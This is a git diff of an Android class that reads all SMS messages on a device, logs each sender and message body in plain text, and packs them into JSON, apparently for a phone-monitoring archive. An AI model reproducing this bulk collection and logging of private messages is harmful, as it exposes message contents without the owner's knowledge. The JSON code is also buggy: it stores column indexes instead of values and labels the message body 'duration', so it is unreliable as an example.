@@ -1,50 +1,90 @@
 package com.inet.android.archive.sms;
 
-import java.util.ArrayList;
-import java.util.List;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.util.Log;
 
-import com.inet.android.bs.FileLog;
+import com.inet.android.covertdate.ConvertDate;
 
 /**
  * Archive Sms. Watch sms
  * 
  * 
  */
-public class ArchiveSms {
-	static Context context;
+public class ArchiveSms extends AsyncTask<Context, Void, Void> {
+	ConvertDate date;
+	Context mContext;
 	private static final String TAG = "ArchiveSMS";
-	private static long id = 0;
 
-	public ArchiveSms(Context mContext) {
-		// TODO јвтоматически созданна€ заглушка конструктора
-		ArchiveSms.context = mContext;
-		Log.d("Getinfo", "context");
-	}
+	// private static long id = 0;
 
-	public void getSms() {
+	// public ArchiveSms(Context context) {
+	// // TODO јвтоматически созданна€ заглушка конструктора
+	// ArchiveSms.mContext = context;
+	// Log.d("Getinfo", "context");
+	// }
+
+	public void getSmsLogs() {
 		try {
+			// формируем JSONobj
+			JSONObject AllCallJson = new JSONObject();
+			date = new ConvertDate();
+			String sType = "null";
 			Uri uri = Uri.parse("content://sms");
-			Cursor sms_sent_cursor = context.getContentResolver().query(uri,
+			Cursor sms_sent_cursor = mContext.getContentResolver().query(uri,
 					null, null, null, null);
 			// Read the sms data and store it in the list
 			if (sms_sent_cursor != null) {
 				if (sms_sent_cursor.moveToFirst()) {
 					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
-
+						// Type of call retrieved from the cursor.
+						int type = sms_sent_cursor.getInt(sms_sent_cursor
+								.getColumnIndex("type"));
+						 Log.e("Info","SMS Type : " + type);
+	                       	switch (type) {
+						case 1:
+							sType = "5";
+							break;
+						case 2:
+							sType = "6";
+							break;
+						default:
+							break;
+						}
 						Log.d(TAG,
 								sms_sent_cursor.getString(sms_sent_cursor
 										.getColumnIndex("address"))
 										+ sms_sent_cursor.getString(sms_sent_cursor
 												.getColumnIndex("body"))
-										+ sms_sent_cursor.getString(sms_sent_cursor
-												.getColumnIndexOrThrow("date"))
-										+ sms_sent_cursor.getInt(sms_sent_cursor
-												.getColumnIndex("type")));
+										+ date.getData(sms_sent_cursor.getLong(sms_sent_cursor
+												.getColumnIndexOrThrow("date")))
+										+ sType);
+
+						try {
+							JSONObject archiveCallJson = new JSONObject();
+							JSONObject infoCallJson = new JSONObject();
+
+							archiveCallJson
+									.put("time",
+											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
+													.getColumnIndexOrThrow("date"))));
+							archiveCallJson.put("type", sType);
+							infoCallJson.put("tel",
+									sms_sent_cursor.getColumnIndex("address"));
+							infoCallJson.put("duration",
+									sms_sent_cursor.getColumnIndex("body"));
+							archiveCallJson.put("info", infoCallJson);
+							AllCallJson.put("data", archiveCallJson);
+
+						} catch (JSONException e) {
+							// TODO јвтоматически созданный блок catch
+							e.printStackTrace();
+						}
 
 						sms_sent_cursor.moveToNext();
 
@@ -71,8 +111,11 @@ public class ArchiveSms {
 						 * } }
 						 */
 					}
+
 				}
 				sms_sent_cursor.close();
+				// Log.d("JsonSms", AllCallJson.toString());
+
 			} else
 				Log.e(TAG, "Send Cursor is Empty");
 		} catch (Exception sggh) {
@@ -80,4 +123,21 @@ public class ArchiveSms {
 		}
 
 	}
+
+	@Override
+	protected Void doInBackground(Context... params) {
+		// TODO јвтоматически созданна€ заглушка метода
+		Log.d("doInBack", "doIn");
+		this.mContext = params[0];
+		Log.d("doInBack", mContext.toString());
+		getSmsLogs();
+		return null;
+	}
+
+	@Override
+	protected void onPostExecute(Void result) {
+		// TODO Auto-generated method stub
+		super.onPostExecute(result);
+	}
+
 }
